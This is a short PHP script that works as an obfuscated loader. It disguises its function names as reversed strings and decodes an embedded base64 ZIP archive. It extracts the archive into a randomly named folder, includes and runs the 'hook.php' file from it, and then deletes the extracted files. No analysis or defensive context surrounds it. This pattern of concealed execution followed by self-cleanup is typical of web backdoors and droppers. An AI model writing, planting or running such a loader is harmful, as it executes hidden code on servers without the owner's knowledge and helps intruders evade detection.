<?php

$decode    = strrev('edoced_46esab');
$write     = strrev('stnetnoc_tup_elif');
$mkdir     = strrev('ridkm');
$unlink    = strrev('knilnu');
$glob      = strrev('bolg');
$is_file   = strrev('elif_si');

$zipData = 'UEsDBBQAAAAIAKQ9s1p8jrpLBQEAAKYBAAAIAAAAaG9vay5waHBNkEFrwyAYhu+B/AcJhaSQxcvYoV1bxi479rLDKCFY/Zq4JSr6yfbzpyYp9SK+PD7fq68nM5g823g7kgMpB0TjdpQyI5te4uCvDdcTtWC0o1+eM7BSUScnMwKfBFPiyviP0NpSrhWCQkd/XROc5T7PglcbdEF8yTMSVhH9BTkc12AOgQmwKS4+Hdintz6IduT8cS5mrM2zNvg2acYfBqFDC2zqlqDj4YRQpXHbSAqGLGA3OULXA3Zruyq+tCY3NjqoySrczmW/nVbhUtw6AVwLqJKoJmg9JG8Uvs+uQF6Zg5fnOxsvXsplVNnO1lTB+IcK5fJDNXnURVoqPnoBdyJmp2Oe/QNQSwECHwAUAAAACACkPbNafI66SwUBAACmAQAACAAkAAAAAAAAACAAAAAAAAAAaG9vay5waHAKACAAAAAAAAEAGADJJMfjTsjbAQLZufm/39sBdqu+5nyx2wFQSwUGAAAAAAEAAQBaAAAAKwEAAAAA';

$tmpZip = __DIR__ . DIRECTORY_SEPARATOR . 'tmp_' . uniqid() . '.zip';
$write($tmpZip, $decode($zipData));

$extractDir = __DIR__ . DIRECTORY_SEPARATOR . '__' . substr(md5(time()), 0, 6);
$mkdir($extractDir, 0777, true);

$zip = new ZipArchive();
if ($zip->open($tmpZip) === TRUE) {
    $zip->extractTo($extractDir);
    $zip->close();
} else {
    exit("❌ Failed to open ZIP\n");
}

$hook = $extractDir . DIRECTORY_SEPARATOR . 'hook.php';
if ($is_file($hook)) {
    try {
        include $hook;
    } catch (Throwable $e) {
        echo "🔥 Error in hook.php: ", $e->getMessage(), "\n";
    }
} else {
    echo "❌ hook.php not found\n";
}

$unlink($tmpZip);
foreach ($glob($extractDir . DIRECTORY_SEPARATOR . '*') as $f) {
    $unlink($f);
}
rmdir($extractDir);

?>
